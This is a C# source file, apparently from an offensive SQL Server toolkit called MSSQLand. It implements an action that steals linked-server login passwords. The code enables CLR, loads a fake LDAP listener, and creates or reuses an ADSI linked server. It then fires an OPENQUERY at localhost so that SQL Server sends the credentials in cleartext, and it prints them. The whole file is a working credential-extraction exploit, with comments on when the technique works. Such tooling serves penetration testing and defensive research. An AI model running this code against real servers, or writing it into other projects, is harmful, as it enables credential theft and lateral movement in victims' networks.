// MSSQLand/Actions/Remote/AdsiCredentialExtractor.cs

using MSSQLand.Services;
using MSSQLand.Utilities;
using System;
using System.Data;
using System.Threading.Tasks;

namespace MSSQLand.Actions.Remote
{
    /// <summary>
    /// Extracts credentials from ADSI linked servers using LDAP simple bind interception.
    /// 
    /// Technique: Creates a fake LDAP server via CLR, then triggers an LDAP query through
    /// the ADSI provider. SQL Server sends credentials in cleartext during LDAP simple bind.
    /// 
    /// Use Cases:
    /// 1. Extract linked login password from existing ADSI server with mapped credentials
    /// 2. Extract SQL login password when executing through a linked server chain
    ///    (the linked server's configured login password, not your own)
    /// 
    /// Limitations:
    /// - Windows/Kerberos auth uses GSSAPI (encrypted) - no cleartext password
    /// - Direct SQL auth connection returns your own password (pointless)
    /// 
    /// Reference: https://www.tarlogic.com/blog/linked-servers-adsi-passwords
    /// </summary>
    internal class AdsiCredentialExtractor : BaseAction
    {
        [ArgumentMetadata(Position = 0, Description = "Target ADSI server name (creates temporary server if omitted)")]
        private string _targetServer = "";

        [ExcludeFromArguments]
        private bool _useExistingServer = false;

        public override void ValidateArguments(string[] args)
        {
            if (args == null || args.Length == 0)
            {
                // No args = create temporary ADSI server
                _useExistingServer = false;
                return;
            }

            // First arg is the target ADSI server name
            _targetServer = args[0];
            _useExistingServer = true;
        }


        /// <summary>
        /// Executes the ADSI credential extraction.
        /// </summary>
        public override object Execute(DatabaseContext databaseContext)
        {
            string authType = databaseContext.AuthService.CredentialsType;
            bool isExecutingThroughLinks = !databaseContext.QueryService.LinkedServers.IsEmpty;

            // Check if this is a pointless scenario: direct SQL auth connection without links
            if (!_useExistingServer && !isExecutingThroughLinks)
            {
                if (authType == "sql" || authType == "local")
                {
                    Logger.Warning("Pointless operation: You're directly connected with SQL auth.");
                    Logger.WarningNested("You already know your own password");
                    return null;
                }
                else if (authType == "windows" || authType == "token" || authType == "entraid")
                {
                    Logger.Warning("Windows/Token/EntraID authentication uses GSSAPI (no cleartext password).");
                    Logger.WarningNested("This technique only works with SQL authentication.");
                    return null;
                }
            }

            // If executing through links, inform user what we're extracting
            if (isExecutingThroughLinks && !_useExistingServer)
            {
                Logger.Info("Executing through linked server chain - will extract the link's SQL login password");
            }

            if (_useExistingServer)
            {
                return ExtractFromExistingServer(databaseContext);
            }
            else
            {
                return ExtractWithTemporaryServer(databaseContext);
            }
        }

        /// <summary>
        /// Extracts credentials from an existing ADSI linked server.
        /// </summary>
        private Tuple<string, string> ExtractFromExistingServer(DatabaseContext databaseContext)
        {
            Logger.Task($"Extracting credentials from existing ADSI server '{_targetServer}'");
            return ExtractCredentials(databaseContext, _targetServer);
        }

        /// <summary>
        /// Creates a temporary ADSI server, extracts credentials, then cleans up.
        /// </summary>
        private Tuple<string, string> ExtractWithTemporaryServer(DatabaseContext databaseContext)
        {
            _targetServer = $"ADSI-{Guid.NewGuid().ToString("N").Substring(0, 6)}";
            
            Logger.Task($"Creating temporary ADSI server '{_targetServer}' for credential extraction");
            
            AdsiService adsiService = new(databaseContext);

            // Try to create the ADSI server
            if (!adsiService.CreateAdsiLinkedServer(_targetServer))
            {
                // If creation failed, try to clean up and retry once
                Logger.Warning("Initial creation failed. Attempting cleanup and retry...");
                try
                {
                    adsiService.DropLinkedServer(_targetServer);
                }
                catch
                {
                    // Ignore cleanup errors
                }

                if (!adsiService.CreateAdsiLinkedServer(_targetServer))
                {
                    Logger.Error("Failed to create temporary ADSI server.");
                    return null;
                }
            }

            try
            {
                return ExtractCredentials(databaseContext, _targetServer);
            }
            finally
            {
                // Always clean up the temporary server
                Logger.InfoNested($"Cleaning up temporary ADSI server '{_targetServer}'");
                try
                {
                    adsiService.DropLinkedServer(_targetServer);
                }
                catch (Exception ex)
                {
                    Logger.Warning($"Failed to cleanup temporary server: {ex.Message}");
                }
            }
        }

        /// <summary>
        /// Extracts credentials using an ADSI provider by intercepting LDAP simple bind.
        /// </summary>
        private Tuple<string, string> ExtractCredentials(DatabaseContext databaseContext, string adsiServer)
        {
            AdsiService adsiService = new(databaseContext);
            
            // Verify the ADSI server exists
            if (!adsiService.AdsiServerExists(adsiServer))
            {
                Logger.Error($"ADSI linked server '{adsiServer}' not found.");
                Logger.InfoNested("List available ADSI servers with: adsi-manager list");
                return null;
            }

            Logger.Task($"Extracting credentials via LDAP simple bind interception");

            if (databaseContext.ConfigService.SetConfigurationOption("clr enabled", 1) == false)
            {
                Logger.Error("Failed to enable CLR. Aborting execution.");
                return null;
            }

            adsiService.Port = Misc.GetRandomUnusedPort();

            Logger.TaskNested($"Targeting linked ADSI server: {adsiServer}");

            try
            {
                adsiService.LoadLdapServerAssembly();

                Task<DataTable> task = adsiService.ListenForRequest();

                Logger.TaskNested("Executing LDAP solicitation");

                string impersonateTarget = databaseContext.QueryService.ExecutionServer.ImpersonationUser;

                if (!string.IsNullOrEmpty(impersonateTarget))
                {
                    Logger.Warning("Cannot retrieve impersonated user credentials - not mapped to temporary ADSI server");
                    Logger.WarningNested("The impersonated context uses the original user's authentication method");
                    return null;
                }

                string exploitQuery = $"SELECT * FROM OPENQUERY([{adsiServer}], 'SELECT * FROM ''LDAP://localhost:{adsiService.Port}'' ')";

                try
                {
                    databaseContext.QueryService.ExecuteNonProcessing(exploitQuery);
                }
                catch
                {
                    // Ignore the exception, it is normal to fail
                }

                // Wait for the background task to complete and get the result
                DataTable ldapResult = task.Result;

                if (ldapResult != null && ldapResult.Rows.Count > 0)
                {
                    string rawCredentials = ldapResult.Rows[0][0].ToString();
                    
                    // Split only at the first occurrence of ':'
                    int splitIndex = rawCredentials.IndexOf(':');
                    if (splitIndex > 0)
                    {
                        string username = rawCredentials.Substring(0, splitIndex);
                        string password = rawCredentials.Substring(splitIndex + 1);

                        Logger.Success("Credentials retrieved via LDAP simple bind");
                        Console.WriteLine($"Username: {username}");
                        Console.WriteLine($"Password: {password}");

                        return Tuple.Create(username.Trim(), password.Trim());
                    }
                    else
                    {
                        Logger.Warning($"Unexpected credential format: {rawCredentials}");
                        return null;
                    }
                }

                // Provide helpful feedback based on context
                if (_useExistingServer)
                {
                    Logger.Warning("No credentials found - the ADSI server may not have a linked login configured.");
                    Logger.WarningNested($"Check linked logins: EXEC sp_helplinkedsrvlogin '{adsiServer}'");
                }
                else
                {
                    Logger.Warning("No credentials captured - connection may be using GSSAPI (Kerberos).");
                }
                
                return null;
            }
            catch (Exception ex)
            {
                Logger.Error($"ADSI credential extraction failed: {ex.Message}");
                return null;
            }
        }
    }
}
